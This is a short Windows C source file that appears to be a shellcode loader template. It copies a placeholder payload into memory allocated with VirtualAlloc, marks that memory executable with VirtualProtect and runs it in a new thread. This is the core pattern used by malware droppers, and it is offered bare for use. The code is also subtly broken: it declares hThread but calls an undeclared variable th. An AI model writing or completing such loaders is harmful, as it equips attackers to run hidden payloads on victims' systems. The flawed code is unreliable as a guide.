#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = { "your shellcode here" };
SIZE_T shell_len = sizeof(shellcode);

int main(void) {
	void * memoryBuffer;
	BOOL return_value = true;
	DWORD oldprotect = 0;
	HANDLE hThread;
	// Allocate a memory buffer for payload
	memoryBuffer = VirtualAlloc(NULL, shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to memory buffer
	memmove((memoryBuffer), (shellcode), (shell_len));
	return_value = VirtualProtect(memoryBuffer, shell_len, PAGE_EXECUTE_READ, &oldprotect);
	if (return_value != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memoryBuffer, 0, 0, 0);
		WaitForSingleObject(th, INFINITE);
	}
	return 0;

}